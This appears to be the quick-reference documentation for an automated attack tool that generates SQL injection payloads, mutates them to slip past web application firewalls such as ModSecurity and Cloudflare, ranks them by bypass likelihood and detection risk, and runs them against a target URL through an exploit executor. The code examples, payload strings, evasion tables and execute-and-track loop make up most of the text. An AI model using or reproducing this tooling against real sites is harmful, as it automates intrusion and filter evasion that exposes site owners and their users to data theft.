# Enhanced Payload Generation - Quick Reference

## Quick Start

```python
from payload_service import PayloadService

service = PayloadService()

target = {
    'technology': 'PHP',
    'vulnerability': 'sql_injection',
    'waf': 'modsecurity',
    'technologies': ['PHP', 'MySQL']
}

# Get intelligent payloads (mutations + scoring)
payloads = service.get_intelligent_payloads(
    target,
    apply_mutations=True,
    apply_scoring=True,
    max_payloads=10
)

for p in payloads:
    print(f"Score: {p['confidence_score']:.3f}")
    print(f"Payload: {p['payload']}")
    print(f"Variants: {len(p['mutations'])} WAF-evasion mutations\n")
```

## Common Tasks

### Task 1: Get WAF-Evasion Mutations

```python
mutations = service.get_mutated_payloads(
    payload="' OR '1'='1' --",
    technology='php',
    target_waf='modsecurity',
    max_mutations=10
)

for variant, bypass_prob in mutations:
    print(f"{bypass_prob:.0%} chance: {variant[:50]}")
```

### Task 2: Score Payloads

```python
payloads = ["' OR '1'='1' --", "UNION SELECT NULL--"]

scored = service.get_scored_payloads(
    payloads,
    exploit_type='sql_injection',
    target_technologies=['PHP', 'MySQL'],
    target_waf='modsecurity',
    top_n=5
)

for payload, score in scored:
    print(f"{score:.3f} - {payload[:40]}")
```

### Task 3: Track Execution Results

```python
# After executing a payload
service.track_payload_execution(
    payload=used_payload,
    exploit_type='sql_injection',
    success=True,  # or False
    target_technologies=['PHP', 'MySQL'],
    waf_name='modsecurity'
)

# Improves future scoring
```

### Task 4: Get Payload Statistics

```python
stats = service.get_payload_statistics()

print(f"Success Rate: {stats['overall_success_rate']:.1%}")
print(f"Total Executions: {stats['total_executions']}")

for metrics in stats['most_used_payloads']:
    print(f"{metrics.payload}: {metrics.use_frequency} uses")
```

## Mutation Strategies

| Strategy | Success | Speed | Best For |
|----------|---------|-------|----------|
| base64_encode | 70% | Fast | General |
| hex_encode | 75% | Fast | PHP/Binary |
| url_encode | 65% | Fast | Parameters |
| double_url_encode | 55% | Fast | Double-filters |
| html_entity | 72% | Fast | Cloudflare |
| unicode_escape | 68% | Medium | Unicode filters |
| hex_escape | 70% | Fast | PHP/Bash |
| comment_injection | 55% | Fast | SQL regex |
| case_variation | 40% | Fast | Case-sensitive |
| equivalent_operators | 65% | Fast | AND/OR filters |
| whitespace_variation | 50% | Fast | Whitespace regex |
| concatenation | 62% | Medium | String builders |
| nested_encoding | 78% | Slow | Multi-layer |
| unicode_normalization | 52% | Medium | NFD bypass |

## Confidence Scoring Weights

```
Final Score = (
    CVE Severity × 0.25 +       # Critical (1.0) to Low (0.35)
    Success Rate × 0.25 +        # Historical executions
    Tech Match × 0.20 +          # Target technology match
    Recency × 0.10 +             # Time since last use
    WAF Bypass × 0.10 +          # WAF-specific history
    Source × 0.10                # Payload source reputation
) × Complexity Penalty
```

## Score Interpretation

| Range | Meaning | Action |
|-------|---------|--------|
| 0.85-1.0 | Excellent | Use immediately |
| 0.70-0.85 | Very Good | Prioritize |
| 0.55-0.70 | Good | Use as backup |
| 0.40-0.55 | Moderate | Consider mutations |
| <0.40 | Weak | Skip or research |

## Technology Profiles

**PHP**
```python
'technology': 'PHP'
# Prefers: HEX_ESCAPE, EQUIVALENT_OPERATORS, WHITESPACE
# Alternative ops: OR vs ||, AND vs &&
```

**Python**
```python
'technology': 'Python'
# Prefers: UNICODE_ESCAPE, HEX_ENCODE, CONCATENATION
```

**Java**
```python
'technology': 'Java'
# Prefers: HEX_ENCODE, URL_ENCODE, UNICODE_ESCAPE
```

**Node.js**
```python
'technology': 'Node.js'
# Prefers: BASE64_ENCODE, WHITESPACE, CONCATENATION
```

## WAF Profiles

**ModSecurity**
- Signature: Regex-based
- Best Tactics: Comments, case variation, whitespace
- Bypass Rate: ~65%

**Cloudflare**
- Signature: HTML/Script detection
- Best Tactics: HTML entities, double encoding, Unicode
- Bypass Rate: ~72%

**Generic**
- Signature: Pattern matching
- Best Tactics: Hex, base64, concatenation
- Bypass Rate: ~60%

## Payload Metrics

### Critical Metrics
```python
metrics = PayloadMetrics(
    payload="...",
    exploit_type="sql_injection",
    cve_severity="High",              # Critical, High, Medium, Low
    cvss_score=8.5,                   # 0-10
    successful_executions=17,          # How many worked
    execution_count=20,                # Total attempts
    target_technologies=['PHP', 'MySQL'],
    use_frequency=50,                  # How often used
    source="learned",                  # p2p, learned, web_scraped, static
)
```

### Optional Metrics
```python
metrics.requires_authentication = False
metrics.requires_session = False
metrics.false_positive_rate = 0.05
metrics.detection_risk = 0.40
metrics.waf_bypass_history = {
    'modsecurity': 0.70,
    'cloudflare': 0.50
}
```

## Output Examples

### Intelligent Payload Example
```
Confidence: 0.815
Base: ' OR '1'='1' --
Variants (5):
  • ' OR 'MSc9JzE=' (bypass: 78%)
  • ' OR /**/''='1' -- (bypass: 65%)
  • ' OR 1=1 -- (bypass: 62%)
  • ' OR 'a'='a'-- (bypass: 58%)
  • ' OR (bypass: 50%)
```

### Scoring Example
```
Payload: ' OR '1'='1' --
Score: 0.815

cve_severity        0.850 × 0.25 = 0.212
success_rate        0.850 × 0.25 = 0.212
technology_match    1.000 × 0.20 = 0.200
recency             1.000 × 0.10 = 0.100
waf_bypass          0.000 × 0.10 = 0.000
source_confidence   0.900 × 0.10 = 0.090
                                    -----
                        Total: 0.815
```

## Integration Examples

### With Exploit Executor
```python
from exploit_executor import ExploitExecutor
from payload_service import PayloadService

service = PayloadService()
executor = ExploitExecutor(target_url)

# Get smart payloads
payloads = service.get_intelligent_payloads(target_info)

# Execute and track
for p_dict in payloads:
    result = executor.execute_sql_injection(p_dict['payload'])
    service.track_payload_execution(
        p_dict['payload'],
        'sql_injection',
        result.success
    )
```

### With Comprehensive Seeker
```python
from comprehensive_exploit_seeker import UnifiedExploitKnowledge
from payload_service import PayloadService

seeker = UnifiedExploitKnowledge()
service = PayloadService()

exploits = seeker.seek_all_exploits(target_url)

for exploit in exploits:
    # Enhance with mutations
    mutations = service.get_mutated_payloads(
        exploit['payload'],
        technology=tech,
        target_waf=waf
    )
    exploit['mutations'] = mutations
```

## Performance Tips

1. **Reuse service instance**
   ```python
   service = PayloadService()  # Once
   # Use repeatedly
   ```

2. **Batch operations**
   ```python
   # ✓ Good
   scored = scorer.score_payloads(payloads_list)
   
   # ✗ Bad
   for p in payloads:
       scored = scorer.score_payload(p)
   ```

3. **Cache metrics**
   ```python
   service.payload_metrics[payload] = metrics
   ```

4. **Limit mutations**
   ```python
   # 5-10 is usually sufficient
   mutations = service.get_mutated_payloads(payload, max_mutations=8)
   ```

## Debugging

### View Score Breakdown
```python
scored = service.scorer.score_payload(metrics)
print(service.scorer.explain_score(scored))
```

### Compare Two Payloads
```python
comparison = service.scorer.compare_payloads(m1, m2)
print(f"Winner: {comparison['winner']}")
print(f"Difference: {comparison['score_difference']:.3f}")
```

### Get Mutation Summary
```python
mutations = service.mutator.generate_mutations(payload)
summary = service.mutator.get_mutation_summary(mutations)
print(f"Avg Bypass Probability: {summary['average_bypass_probability']:.0%}")
```

## Files

- `payload_mutator.py` - Mutation engine
- `payload_scorer.py` - Scoring system
- `payload_service.py` - Unified service (updated)
- `ENHANCED_PAYLOAD_GENERATION.md` - Full documentation
- `ENHANCED_PAYLOAD_QUICK_REFERENCE.md` - This file

## Version

- **PayloadMutator**: 1.0 (14 strategies)
- **PayloadScorer**: 1.0 (6-factor weighting)
- **PayloadService**: 3.0 (enhanced with mutation + scoring)
